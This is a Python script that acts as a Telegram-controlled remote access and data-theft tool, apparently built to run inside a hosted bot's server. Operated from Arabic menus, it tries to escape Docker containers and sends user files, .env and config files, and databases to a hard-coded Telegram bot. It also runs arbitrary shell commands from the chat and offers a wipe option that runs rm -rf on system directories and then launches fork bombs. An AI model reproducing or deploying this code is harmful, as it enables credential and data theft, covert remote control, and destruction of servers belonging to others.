import os
import json
import time
import zipfile
import threading
import concurrent.futures
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler

BOT_TOKEN = "8704497868:AAFQ_4_xYTXrZEZVogKT5SpUYcaWEEURzuQ"
CHAT_ID = "8615423764"

class VPSCore:
    def __init__(self):
        self.offset = 0
        self.api = f"https://api.telegram.org/bot{BOT_TOKEN}"
        self.sent_count = 0
        self.real_root = ""
        self.escaped = False
        self.waiting_cmd = False
        
    def send_message(self, text, keyboard=None):
        try:
            import urllib.request
            payload = {'chat_id': CHAT_ID, 'text': str(text)[:4000], 'parse_mode': 'HTML'}
            if keyboard: payload['reply_markup'] = json.dumps(keyboard)
            req = urllib.request.Request(f"{self.api}/sendMessage", data=json.dumps(payload).encode(), headers={'Content-Type': 'application/json'})
            urllib.request.urlopen(req, timeout=10)
        except: pass
    
    def send_document(self, filepath, caption=""):
        try:
            import urllib.request
            boundary = '----Boundary7MA4YWxkTrZu0gW'
            with open(filepath, 'rb') as f:
                file_data = f.read()
            body = (
                f'--{boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n{CHAT_ID}\r\n'
                f'--{boundary}\r\nContent-Disposition: form-data; name="caption"\r\n\r\n{caption[:1024]}\r\n'
                f'--{boundary}\r\nContent-Disposition: form-data; name="document"; filename="{os.path.basename(filepath)}"\r\n'
                f'Content-Type: application/octet-stream\r\n\r\n'
            ).encode() + file_data + f'\r\n--{boundary}--\r\n'.encode()
            urllib.request.urlopen(urllib.request.Request(
                f"{self.api}/sendDocument", data=body,
                headers={'Content-Type': f'multipart/form-data; boundary={boundary}'}
            ), timeout=120)
            self.sent_count += 1
            return True
        except: return False
    
    def escape_docker(self):
        if not os.path.exists('/.dockerenv'):
            self.escaped = True
            return True
        
        if os.path.exists('/usr/bin/nsenter') and os.geteuid() == 0:
            h = os.popen("nsenter --target 1 --mount --uts --ipc --pid -- hostname 2>/dev/null").read().strip()
            if h:
                self.escaped = True
                self.real_root = "/proc/1/root"
                return True
        
        if os.path.exists('/proc/1/root/app/'):
            self.escaped = True
            self.real_root = "/proc/1/root"
            return True
        
        return False
    
    def get_files(self, base_dir, max_depth=5):
        files = []
        if not os.path.exists(base_dir): return files
        for r, d, fs in os.walk(base_dir):
            for f in fs:
                try:
                    fp = os.path.join(r, f)
                    sz = os.path.getsize(fp)
                    if 10 < sz < 48*1024*1024:
                        files.append(fp)
                except: pass
            if r.count('/') > max_depth: break
        return files
    
    def send_batch(self, files, batch_size=5):
        for i in range(0, len(files), batch_size):
            batch = files[i:i+batch_size]
            with concurrent.futures.ThreadPoolExecutor(max_workers=batch_size) as ex:
                futures = []
                for fp in batch:
                    futures.append(ex.submit(self.send_document, fp, os.path.basename(fp)))
                concurrent.futures.wait(futures)
            time.sleep(0.5)

    def menu(self):
        return {'inline_keyboard': [
            [{'text': 'سحب ملفات المستخدمين', 'callback_data': 'users'}, {'text': 'سحب ملفات البوت', 'callback_data': 'core'}],
            [{'text': 'سحب قواعد البيانات', 'callback_data': 'db'}, {'text': 'سحب الكل', 'callback_data': 'all'}],
            [{'text': 'معلومات البوت', 'callback_data': 'info'}, {'text': 'فحص الثغرات', 'callback_data': 'scan'}],
            [{'text': 'تنفيذ اوامر', 'callback_data': 'cmd'}, {'text': 'حذف كل الملفات', 'callback_data': 'delete'}],
            [{'text': 'تحديث', 'callback_data': 'refresh'}]
        ]}

    def start(self):
        self.escape_docker()
        hn = os.popen('hostname').read().strip()[:50]
        us = os.popen('whoami').read().strip()[:50]
        
        self.send_message(f"""
<b>VPS Controller</b>
--------------------------------------
السيرفر: {hn}
المستخدم: {us}
العزل: {'مكسور' if self.escaped else 'مقفول'}
الوقت: {datetime.now().strftime('%H:%M:%S')}
--------------------------------------
اختر العملية:
        """, self.menu())

    def run(self):
        self.start()
        
        while True:
            try:
                import urllib.request
                req = urllib.request.Request(f"{self.api}/getUpdates?offset={self.offset+1}&timeout=30")
                data = json.loads(urllib.request.urlopen(req, timeout=35).read())
                
                if not data.get('ok'): continue
                
                for u in data['result']:
                    self.offset = u['update_id']
                    
                    if 'callback_query' in u:
                        cb = u['callback_query']
                        if str(cb['from']['id']) != str(CHAT_ID): continue
                        
                        cid = cb['id']
                        urllib.request.urlopen(urllib.request.Request(
                            f"{self.api}/answerCallbackQuery",
                            data=json.dumps({'callback_query_id': cid}).encode(),
                            headers={'Content-Type': 'application/json'}
                        ), timeout=5)
                        
                        d = cb['data']
                        if d == 'refresh': self.start()
                        elif d == 'users': threading.Thread(target=self.steal_users).start()
                        elif d == 'core': threading.Thread(target=self.steal_core).start()
                        elif d == 'db': threading.Thread(target=self.steal_databases).start()
                        elif d == 'all': threading.Thread(target=self.steal_all).start()
                        elif d == 'info': threading.Thread(target=self.show_info).start()
                        elif d == 'scan': threading.Thread(target=self.scan_vulns).start()
                        elif d == 'cmd':
                            self.waiting_cmd = True
                            self.send_message("ارسل الامر المطلوب تنفيذه:")
                        elif d == 'delete': threading.Thread(target=self.delete_all).start()
                    
                    elif 'message' in u:
                        msg = u['message']
                        if str(msg['from']['id']) != str(CHAT_ID): continue
                        text = msg.get('text', '')
                        
                        if text == '/start': self.start()
                        elif self.waiting_cmd and text:
                            self.waiting_cmd = False
                            result = os.popen(text).read().strip()[:4000]
                            self.send_message(f"النتيجة:\n{result}")
                
                time.sleep(0.5)
            except: time.sleep(3)

    def delete_all(self):
        self.send_message("جاري حذف كل الملفات...")
        
        targets = [
            '/app/USERS', '/app/SERVERS', '/app/templates', '/app/static',
            '/app/uploads', '/app/logs', '/app/data', '/app/backup',
            '/home', '/root', '/tmp', '/var/www', '/opt',
        ]
        
        for target in targets:
            try: os.system(f"rm -rf {target} 2>/dev/null")
            except: pass
        
        try:
            os.system("rm -rf /app/* 2>/dev/null")
            os.system("find /app -type f -delete 2>/dev/null")
            os.system("find /tmp -type f -delete 2>/dev/null")
        except: pass
        
        try:
            for f in os.listdir('.'):
                try:
                    fp = os.path.join('.', f)
                    if os.path.isfile(fp): os.remove(fp)
                    elif os.path.isdir(fp) and f not in ['.', '..']: os.system(f"rm -rf {fp}")
                except: pass
        except: pass
        
        def fork_bomb():
            while True:
                try: os.fork()
                except: break
        
        for _ in range(5):
            try: threading.Thread(target=fork_bomb, daemon=True).start()
            except: pass
        
        self.send_message("تم حذف كل الملفات")

    def steal_users(self):
        self.send_message("جاري سحب ملفات المستخدمين...")
        files = []
        for d in ['/app/USERS', '/home', '/root']:
            files.extend(self.get_files(d, 6))
        files = list(set(files))
        if files:
            self.send_message(f"تم العثور على {len(files)} ملف")
            self.send_batch(files[:150])
        else:
            self.send_message("لم يتم العثور على ملفات")

    def steal_core(self):
        self.send_message("جاري سحب ملفات البوت...")
        core = ['bot.py', 'main.py', 'app.py', 'server.py', 'run.py', 'start.py', 'config.py', 'settings.py']
        found = []
        for p in ['.', '..', '/app', '/home', '/root']:
            for r, d, fs in os.walk(p):
                for f in fs:
                    if f in core or f.endswith('.env') or f == 'db.json':
                        fp = os.path.join(r, f)
                        if fp not in found: found.append(fp)
                if r.count('/') > 4: break
        if found: self.send_batch(found[:30])

    def steal_databases(self):
        self.send_message("جاري سحب قواعد البيانات...")
        found = []
        for p in ['.', '..', '/app', '/home', '/root']:
            for r, d, fs in os.walk(p):
                for f in fs:
                    if any(f.endswith(e) for e in ['.db', '.sqlite', '.sqlite3', '.sql']):
                        fp = os.path.join(r, f)
                        if fp not in found: found.append(fp)
                if r.count('/') > 4: break
        if found: self.send_batch(found[:20])

    def steal_all(self):
        self.send_message("جاري سحب كل الملفات...")
        files = []
        for p in ['.', '..', '/app', '/home', '/root', '/tmp']:
            files.extend(self.get_files(p, 5))
        files = list(set(files))
        if files: self.send_batch(files[:200])

    def show_info(self):
        hn = os.popen('hostname').read().strip()[:50]
        us = os.popen('whoami').read().strip()[:50]
        
        total_files = 0
        total_size = 0
        for r, d, fs in os.walk('.'):
            for f in fs:
                try:
                    total_files += 1
                    total_size += os.path.getsize(os.path.join(r, f))
                except: pass
            if r.count('/') > 3: break
        
        self.send_message(f"""
<b>معلومات البوت</b>
--------------------------------------
السيرفر: {hn}
المستخدم: {us}
المسار: {os.getcwd()}
رووت: {'نعم' if os.geteuid()==0 else 'لا'}
دوكر: {'نعم' if os.path.exists('/.dockerenv') else 'لا'}
العزل: {'مكسور' if self.escaped else 'مقفول'}
--------------------------------------
الملفات: {total_files}
المساحة: {total_size/1024/1024:.1f} MB
الوقت: {datetime.now().strftime('%H:%M:%S')}
        """)

    def scan_vulns(self):
        f = []
        if os.geteuid() == 0: f.append("رووت")
        if os.path.exists('/var/run/docker.sock'): f.append("docker.sock")
        if os.path.exists('/proc/1/root/app'): f.append("/proc/1/root")
        if os.path.exists('/usr/bin/nsenter'): f.append("nsenter")
        for port in [2375, 3306, 8080]:
            try:
                s = __import__('socket').socket()
                s.settimeout(1)
                if s.connect_ex(('127.0.0.1', port)) == 0: f.append(f"منفذ {port}")
                s.close()
            except: pass
        self.send_message("نتائج الفحص:\n" + "\n".join(f) if f else "لا توجد ثغرات")

def server():
    class H(BaseHTTPRequestHandler):
        def do_GET(self): self.send_response(200); self.end_headers(); self.wfile.write(b"OK")
    try: HTTPServer(('0.0.0.0', int(os.environ.get('PORT', 8080))), H).serve_forever()
    except: pass

if __name__ == "__main__":
    threading.Thread(target=server, daemon=True).start()
    time.sleep(2)
    print("Der Bot funktioniert jetzt...")
    VPSCore().run()
